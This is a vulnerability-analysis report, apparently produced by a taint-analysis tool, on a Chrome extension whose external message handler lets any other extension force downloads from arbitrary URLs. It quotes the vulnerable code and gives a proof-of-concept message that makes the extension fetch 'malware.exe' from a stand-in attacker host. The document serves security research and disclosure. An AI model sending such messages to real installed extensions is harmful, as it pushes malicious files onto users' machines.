# CoCo Analysis: jpblofcpgfjikaapfedldfeilmpgkedf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: fetch_source → chrome_downloads_download_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jpblofcpgfjikaapfedldfeilmpgkedf/opgen_generated_files/bg.js
Line 265     var responseText = 'data_from_fetch';
Line 3219    const objectURL = URL.createObjectURL(myBlob);
```

**Code:**

```javascript
// Background script - External message handler (lines 3917-3928)
browser.runtime.onMessageExternal.addListener(
  (request, sender, sendResponse) => {  // ← External extensions can send messages
    switch (request.type) {
      case MESSAGE_TYPES.DOWNLOAD:
        Messaging.handleDownloadMessage(request, sender, sendResponse);
        break;
      default:
        // noop
        break;
    }
  }
);

// Background script - Download message handler (lines 3877-3914)
handleDownloadMessage: (request, sender, sendResponse) => {
  const { url, info, comment } = request.body;  // ← Attacker-controlled URL
  const last = window.lastDownloadState || {
    path: new Path.Path("."),
    scratch: {},
    info: {},
  };

  const opts = {
    currentTab,
    now: new Date(),
    pageUrl: info.pageUrl,
    selectionText: info.selectionText,
    sourceUrl: info.srcUrl,
    url,  // ← Attacker-controlled URL added to opts
    context: DOWNLOAD_TYPES.CLICK,
  };

  if (comment) {
    opts.comment = comment;
  }

  const clickState = {
    path: last.path || new Path.Path("."),
    scratch: last.scratch,
    route: last.route,
    info: Object.assign({}, last.info, opts, info),  // ← URL in clickState.info.url
  };

  requestedDownloadFlag = true;
  Download.renameAndDownload(clickState);  // ← Triggers download flow

  sendResponse({
    type: MESSAGE_TYPES.DOWNLOAD,
    body: { status: MESSAGE_TYPES.OK },
  });
}

// Background script - Fetch and download (lines 3215-3227)
const fetchDownload = (_url) => {
  fetch(_url)  // ← Fetches attacker-controlled URL
    .then((response) => response.blob())
    .then((myBlob) => {
      const objectURL = URL.createObjectURL(myBlob);
      browser.downloads.download({  // ← Downloads the fetched content
        url: objectURL,
        filename: finalFullPath || "_",
        saveAs: prompt,
        conflictAction: options.conflictAction,
      });
    });
};

// Called from Download.renameAndDownload via:
// Line 3244: fetchDownload(_state.info.url);

// manifest.json - Has required permission
{
  "permissions": [
    "downloads",  // ← Required permission is present
    "<all_urls>"  // ← Can fetch from any URL
  ]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External extension message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious extension sends message to this extension
const targetExtensionId = "jpblofcpgfjikaapfedldfeilmpgkedf";

chrome.runtime.sendMessage(targetExtensionId, {
  type: "DOWNLOAD",  // MESSAGE_TYPES.DOWNLOAD
  body: {
    url: "https://attacker.com/malware.exe",  // Arbitrary download URL
    info: {
      pageUrl: "https://attacker.com",
      selectionText: "",
      srcUrl: ""
    }
  }
}, (response) => {
  console.log("Download triggered:", response);
});
```

**Impact:** Arbitrary file download vulnerability. A malicious extension can trigger the download of arbitrary files from any URL by sending an external message with type "DOWNLOAD" and a malicious URL in the body. The extension will fetch the content from the attacker-controlled URL and download it to the user's machine. This allows an attacker to force downloads of malicious files (malware, executables, etc.) without user interaction. While the extension does not have `externally_connectable` in manifest.json (meaning websites cannot exploit this directly), ANY other extension installed in the browser can send external messages and trigger this vulnerability. According to the methodology: "If code has chrome.runtime.onMessageExternal, assume ANY attacker can trigger it" and "Even if only ONE specific domain/extension can exploit it → TRUE POSITIVE".
